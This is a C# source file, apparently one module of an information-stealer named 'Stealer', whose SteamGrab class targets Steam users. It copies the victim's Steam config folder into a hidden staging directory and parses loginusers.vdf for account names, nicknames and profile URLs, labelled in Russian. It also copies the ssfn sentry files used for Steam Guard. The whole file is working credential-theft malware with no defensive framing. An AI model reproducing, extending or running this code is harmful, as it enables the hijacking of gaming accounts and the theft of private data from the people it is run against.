using System;
using System.IO;

namespace Stealer;

public class SteamGrab
{
	public static int count = 0;

	public static int profiles = 0;

	public static string result = "";

	private static bool in_patch = false;

	public static void get()
	{
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Steam\\config";
			string toDir = Help.path_stealer + "Steam\\config";
			if (Directory.Exists(text))
			{
				Directory.CreateDirectory(Help.path_stealer + "Steam\\");
				CopyAll(text, toDir);
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Steam\\steamapps\\common");
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Steam";
				StreamReader streamReader = new StreamReader(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Steam\\config\\loginusers.vdf");
				while (!streamReader.EndOfStream)
				{
					string text2 = streamReader.ReadLine();
					text2 = text2.Replace("\t", "").Replace("\"", "");
					if (text2.StartsWith("7"))
					{
						result = result + "https://steamcommunity.com/profiles/" + text2 + " \n";
						profiles++;
					}
					else if (text2.StartsWith("A"))
					{
						text2 = text2.Replace("AccountName", "");
						result = result + "   Логин: " + text2 + "\n";
					}
					else if (text2.StartsWith("P"))
					{
						text2 = text2.Replace("PersonaName", "");
						result = result + "   Ник: " + text2 + "\n";
					}
				}
				result += "\n";
				DirectoryInfo[] directories = directoryInfo.GetDirectories();
				foreach (DirectoryInfo directoryInfo2 in directories)
				{
					result = result + directoryInfo2.Name + "\n";
				}
				string[] files = Directory.GetFiles(path);
				foreach (string text3 in files)
				{
					if (text3.Contains("ssfn"))
					{
						string fileName = Path.GetFileName(text3);
						string destFileName = Help.path_stealer + "Steam\\" + fileName;
						File.Copy(text3, destFileName);
					}
				}
				streamReader.Close();
				count++;
			}
			if (!(result == ""))
			{
				File.WriteAllText(Help.path_stealer + "Steam\\SteamInfo.txt", result);
			}
		}
		catch (Exception ex)
		{
			Handler.error(ex.ToString());
		}
	}

	private static void CopyFile(string s1, string toDir)
	{
		try
		{
			string fileName = Path.GetFileName(s1);
			if (!in_patch || fileName[0] == 'm' || fileName[1] == 'a' || fileName[2] == 'p')
			{
				string destFileName = toDir + "\\" + fileName;
				File.Copy(s1, destFileName);
			}
		}
		catch
		{
		}
	}

	private static void CopyDir(string s, string toDir)
	{
		try
		{
			in_patch = true;
			CopyAll(s, toDir + "\\" + Path.GetFileName(s));
			in_patch = false;
		}
		catch
		{
		}
	}

	private static void CopyAll(string fromDir, string toDir)
	{
		try
		{
			Directory.CreateDirectory(toDir).Attributes = FileAttributes.Hidden | FileAttributes.Directory;
			string[] files = Directory.GetFiles(fromDir);
			for (int i = 0; i < files.Length; i++)
			{
				CopyFile(files[i], toDir);
			}
			files = Directory.GetDirectories(fromDir);
			for (int i = 0; i < files.Length; i++)
			{
				CopyDir(files[i], toDir);
			}
		}
		catch
		{
		}
	}
}
